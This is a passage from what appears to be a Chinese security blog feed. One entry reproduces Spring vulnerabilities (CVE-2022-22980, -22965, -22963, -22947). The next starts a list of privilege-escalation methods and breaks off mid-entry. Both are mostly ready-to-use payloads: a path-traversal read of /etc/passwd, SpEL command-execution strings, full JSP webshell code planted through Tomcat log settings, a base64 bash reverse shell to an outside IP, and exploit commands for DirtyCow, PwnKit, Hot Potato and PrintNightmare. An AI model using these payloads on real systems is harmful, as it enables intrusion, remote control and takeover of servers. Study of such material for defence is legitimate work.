&#123;&#123;BaseURL&#125;&#125;/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/42739cd404f743eabf10ed0a61072a10.png" alt="123"></p>
<h2 id="Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980"><a href="#Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980" class="headerlink" title="Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)"></a>Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)</h2><p>影响版本：<br>Spring Data MongoDB &#x3D;&#x3D; 3.4.0<br>3.3.0 &lt;&#x3D; Spring Data MongoDB &lt;&#x3D; 3.3.4</p>
<h3 id="漏洞指纹-6"><a href="#漏洞指纹-6" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>无明显指纹，如果存在spring+mongodb 的组合可以盲打一下</p>
<h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote>
<p>name&#x3D;T(java.lang.String).forName(‘java.lang.Runtime’).getRuntime().exec(‘ls’)</p>
</blockquote>
<h2 id="Spring-Framework-RCE-CVE-2022-22965"><a href="#Spring-Framework-RCE-CVE-2022-22965" class="headerlink" title="Spring Framework RCE(CVE-2022-22965)"></a>Spring Framework RCE(CVE-2022-22965)</h2><p>影响版本：<br>jdk9+ &amp; Spring及其衍生框架 &amp; 使用tomcat部署spring项目 &amp; 使用了POJO参数绑定 &amp; （Spring Framework 5.3.x - 5.3.18 ｜ Spring Framework 2.x - 5.2.20）</p>
<h3 id="漏洞指纹-7"><a href="#漏洞指纹-7" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>无明显漏洞指纹，看到识别到 Spring+Java 的站可以盲打一下</p>
<h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">
class.module.classLoader.resources.context.parent.pipeline.first.pattern=
构建文件的内容

class.module.classLoader.resources.context.parent.pipeline.first.suffix=
修改tomcat日志文件后缀

class.module.classLoader.resources.context.parent.pipeline.first.directory=
写入文件所在的网站根目录

class.module.classLoader.resources.context.parent.pipeline.first.prefix=
写入文件名称

class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
文件日期格式（实际构造为空值即可）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以一个一个的GET发送，或者直接一次性POST发送，GET形如下面这种形式说明payload成功</p>
<h4 id="GET发送"><a href="#GET发送" class="headerlink" title="GET发送"></a>GET发送</h4><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D;spring
class.module.classLoader.resources.context.parent.pipeline.first.suffix&#x3D;.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix&#x3D;shell
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>http://8.130.100.154:8080/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</code><br>最后访问shell.jsp<br><img src="https://img-blog.csdnimg.cn/direct/ab38e2952ee84292be53ac28959e6403.png" alt="132"></p>
<h4 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">url编码前的webshell：
<span class="token operator">%</span><span class="token punctuation">&#123;</span>c2<span class="token punctuation">&#125;</span>i <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"t"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream <span class="token keyword">in</span> <span class="token operator">=</span> <span class="token operator">%</span><span class="token punctuation">&#123;</span>c1<span class="token punctuation">&#125;</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> int a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token keyword">in</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token punctuation">&#123;</span>suffix<span class="token punctuation">&#125;</span>i

url编码后的webshell：
<span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc2<span class="token operator">%</span>7Di<span class="token operator">%</span><span class="token number">20</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token operator">%</span>22t<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span>20in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc1<span class="token operator">%</span>7Di<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span>20int<span class="token operator">%</span>20a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>3B<span class="token operator">%</span>20byte<span class="token operator">%</span>5B<span class="token operator">%</span>5D<span class="token operator">%</span>20b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20new<span class="token operator">%</span>20byte<span class="token operator">%</span>5B2048<span class="token operator">%</span>5D<span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token function">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span>3Din<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">%</span>3D<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token number">20</span><span class="token function">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bsuffix<span class="token operator">%</span>7Di<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以现在只需要把shell.jsp的内容换成下面的</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc2<span class="token operator">%</span>7Di<span class="token operator">%</span><span class="token number">20</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token operator">%</span>22t<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span>20in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc1<span class="token operator">%</span>7Di<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span>20int<span class="token operator">%</span>20a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>3B<span class="token operator">%</span>20byte<span class="token operator">%</span>5B<span class="token operator">%</span>5D<span class="token operator">%</span>20b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20new<span class="token operator">%</span>20byte<span class="token operator">%</span>5B2048<span class="token operator">%</span>5D<span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token function">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span>3Din<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">%</span>3D<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token number">20</span><span class="token function">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bsuffix<span class="token operator">%</span>7Di
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>同时在请求中需要加3个header</p>
<blockquote>
<p>suffix:%&gt;&#x2F;&#x2F;<br>c1:Runtime<br>c2:&lt;%</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/69c6d3cf3a1842fea05860500ed9a43d.png" alt="123"></p>
<h2 id="Spring-Cloud-Function-RCE-CVE-2022-22963"><a href="#Spring-Cloud-Function-RCE-CVE-2022-22963" class="headerlink" title="Spring Cloud Function RCE(CVE-2022-22963)"></a>Spring Cloud Function RCE(CVE-2022-22963)</h2><p>影响版本：<br>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
<h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><p>&#x2F;functionRouter</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>访问&#x2F;functionRouter 使用POST发包，然后在header头里面放置payload<br> <img src="https://img-blog.csdnimg.cn/direct/0c8b5bbb98174599a460796ee4795154.png" alt="456"><br><code>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</code><br>然后服务器监听端口，之后发包，反弹成功<br><img src="https://img-blog.csdnimg.cn/direct/b7db3a870b714466855430367b09815d.png" alt="123"></p>
<h2 id="Spring-Cloud-Gateway-RCE-CVE-2022-22947"><a href="#Spring-Cloud-Gateway-RCE-CVE-2022-22947" class="headerlink" title="Spring Cloud Gateway RCE(CVE-2022-22947)"></a>Spring Cloud Gateway RCE(CVE-2022-22947)</h2><p>这个洞有两个前提</p>
<ul>
<li>management.endpoint.gateway.enabled: true</li>
<li>management.endpoints.web.exposure.include: gateway</li>
</ul>
<p>影响版本<br>pring Cloud Gateway 3.1.0 Spring Cloud Gateway 3.0.0 - 3.0.6 旧的不受支持的版本也受影响</p>
<h3 id="指纹-1"><a href="#指纹-1" class="headerlink" title="指纹"></a>指纹</h3><p>先介绍一下Spring cloud GateWay的actuator相关端点</p>
<ul>
<li><p>获取所有路由：Get请求：<code>http://localhost:xxxx/actuator/gateway/routes/</code></p>
</li>
<li><p>添加路由：POST请求：<code>http://localhost:xxxx/actuator/gateway/routes/</code>路由编号</p>
</li>
<li><p>删除路由：DELETE请求：<code>http://localhost:xxxx/actuator/gateway/routes/</code>路由编号</p>
</li>
<li><p>获取指定路由：GET请求：<code>http://localhost:xxxx/actuator/gateway/routes/</code>路由编号</p>
</li>
<li><p>刷新路由：POST请求：<code>http://localhost:xxxx/actuator/gateway/refresh</code></p>
</li>
</ul>
<p>其中，调用添加路由的端点时，可以向路由中加入filters，过滤器的值允许为spEL表达式，且会解析这个spEL表达式。可以通过构造spEL进行远程命令执行。构造的filters可以直接利用gateway自带的AddResponseHeader，将spEL的执行结果添加到响应头中，直接通过响应头进行查看</p>
<p>所以指纹就很清楚了–&gt; &#x2F;actutor&#x2F;gateway</p>
<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞利用过程为：添加路由–&gt;触发payload–&gt;查看结果 其本质为SpEL表达式注入，在添加路由时的value处插入表达式即可</p>
<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/actuator/gateway/routes/milu</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span><span class="token header-value">x.x.x.x:8080</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">329</span></span>
<span class="token application-json">
<span class="token punctuation">&#123;</span>
  <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"hacktest"</span><span class="token punctuation">,</span>
  <span class="token property">"filters"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"AddResponseHeader"</span><span class="token punctuation">,</span>
    <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Result"</span><span class="token punctuation">,</span>
      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\"id\"&#125;).getInputStream()))&#125;"</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"uri"</span><span class="token operator">:</span> <span class="token string">"http://example.com"</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>alue”: “#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{&quot;id&quot;}).getInputStream()))}”</p>
<p>这里filters里的name可以任意修改为下面的内容</p>
<blockquote>
<p>#过滤器使用说明<br><a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-addrequestheader-gatewayfilter-factory">https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-addrequestheader-gatewayfilter-factory</a></p>
</blockquote>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">AddRequestHeader
MapRequestHeader
AddRequestParameter
AddResponseHeader
ModifyRequestBody
DedupeResponseHeader
ModifyResponseBody
CacheRequestBody
PrefixPath
PreserveHostHeader
RedirectTo
RemoveRequestHeader
RemoveRequestParameter
RemoveResponseHeader
RewritePath
Retry
SetPath
SecureHeaders
SetRequestHeader
SetRequestHostHeader
RewriteResponseHeader
RewriteLocationResponseHeader
SetStatus
SaveSession
StripPrefix
RequestHeaderToRequestUri
RequestSize
RequestHeaderSize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="触发payload"><a href="#触发payload" class="headerlink" title="触发payload"></a>触发payload</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h4><p>访问 –&gt; &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;milu<br><img src="https://img-blog.csdnimg.cn/direct/67419cadda4d4a619e3e40003754c522.png" alt="123"></p>
<h4 id="删除路由"><a href="#删除路由" class="headerlink" title="删除路由"></a>删除路由</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">
DELETE /actuator/gateway/routes/milu HTTP/1.1
Host: 192.168.32.130:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="刷新路由"><a href="#刷新路由" class="headerlink" title="刷新路由"></a>刷新路由</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.32.130:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>参考文章：<a href="https://mp.weixin.qq.com/s/ZwTjUv7jemN7BWx72R9B-A">从0认识+识别+掌握spring全漏洞(1.8w字超详细看完拿捏spring)</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>117种提权手法</title>
    <url>/2023/11/17/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是网络安全中的权限提升？"><a href="#什么是网络安全中的权限提升？" class="headerlink" title="什么是网络安全中的权限提升？"></a>什么是网络安全中的权限提升？</h1><p>在网络安全领域，了解威胁至关重要，而最关键的威胁之一就是特权升级的概念。从本质上讲，权限升级是指攻击者获得通常为高级用户保留的系统权限或功能的情况。</p>
<p>主要有两种类型：垂直升级和水平升级。在垂直升级中，具有较低级别权限的攻击者将其权限提升到较高级别用户（通常是管理员）的权限。这使得他们能够访问受限区域、修改系统配置，甚至部署恶意软件。另一方面，横向升级涉及访问属于对等用户的资源或功能，并利用类似特权帐户的权限。</p>
<p>特权升级的危险是显而易见的。通过提升权限，攻击者可以绕过网络安全措施，从而损害数据完整性、机密性和系统可用性。对于组织而言，这可能会导致数据泄露、系统停机以及潜在的法律和声誉后果。识别权限升级的迹象并部署预防性网络安全措施对于保护数字资产并确保只有授权人员才能访问关键系统功能至关重要。</p>
<p>鉴于网络安全不断发展的形势，对特权升级等威胁保持警惕至关重要。它强调了不断更新安全协议、监控系统活动以及确保正确分配和定期审核用户角色和权限的重要性。这样做，组织可以减轻与未经授权的访问相关的风险，并保持对潜在网络对手的强大防御。</p>
<p>现在我们已经熟悉了这个概念，我们将继续研究这个提权概念的117种方法：</p>
<h1 id="117种提权手法"><a href="#117种提权手法" class="headerlink" title="117种提权手法"></a>117种提权手法</h1><h3 id="DirtyC0w"><a href="#DirtyC0w" class="headerlink" title="DirtyC0w"></a>DirtyC0w</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: <code>gcc -pthread c0w.c -o c0w; ./c0w; passwd; id</code></p>
<p>批注：<a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p>
<h3 id="CVE-2016-1531"><a href="#CVE-2016-1531" class="headerlink" title="CVE-2016-1531"></a>CVE-2016-1531</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: <code>CVE-2016-1531.sh;id</code></p>
<p>批注：<a href="https://github.com/crypticdante/CVE-2016-1531">https://github.com/crypticdante/CVE-2016-1531</a></p>
<h3 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法:</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;secnigma&#x2F;CVE-2021-3560-Polkit-Privilege-Esclation
.&#x2F;2. poc.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="DirtyPipe"><a href="#DirtyPipe" class="headerlink" title="DirtyPipe"></a>DirtyPipe</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>./traitor-amd64 –exploit kernel:CVE-2022-0847</code></li>
<li><code>Whoami;id</code></li>
</ol>
<p>批注：<a href="https://github.com/liamg/traitor/releases/tag/v0.0.14">https://github.com/liamg/traitor/releases/tag/v0.0.14</a></p>
<h3 id="PwnKit"><a href="#PwnKit" class="headerlink" title="PwnKit"></a>PwnKit</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>./cve-2021-4034</code></li>
<li><code>Whoami;id</code></li>
</ol>
<p>批注：<a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
<h3 id="ms14-058"><a href="#ms14-058" class="headerlink" title="ms14_058"></a>ms14_058</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ul>
<li><code>msf &gt; use exploit/windows/local/ms14_058_track_popup_menu</code></li>
<li><code>msf exploit(ms14_058_track_popup_menu) &gt; set TARGET &lt; target-id &gt;</code></li>
<li><code>msf exploit(ms14_058_track_popup_menu) &gt; exploit</code></li>
</ul>
<h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li>命令提示符下: <code>powershell.exe -nop -ep bypass</code></li>
<li>在Power Shell提示符类型输入: <code>Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1</code></li>
<li>在Power Shell提示符类型输入: <code>Invoke-Tater -Trigger 1 -Command “net localgroup administrators user /add”</code></li>
<li>要确认攻击是否成功，请在 Power Shell 提示符中键入: <code>net localgroup administrators</code></li>
</ol>
<p>批注：<a href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></p>
<h3 id="Intel-SYSRET"><a href="#Intel-SYSRET" class="headerlink" title="Intel SYSRET"></a>Intel SYSRET</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>execute -H -f sysret.exe -a &quot;-pid [pid]&quot;</code></li>
</ol>
<p>批注：<a href="https://github.com/jajp777/sysret">https://github.com/jajp777/sysret</a></p>
<p>release版本：<a href="https://github.com/jajp777/sysret/tree/master/x64/Release">https://github.com/jajp777/sysret/tree/master/x64/Release</a></p>
<h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;outflanknl&#x2F;PrintNightmare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li><code>PrintNightmare 10.10.10.10 exp.dll</code></li>
</ol>
<h3 id="Folina"><a href="#Folina" class="headerlink" title="Folina"></a>Folina</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
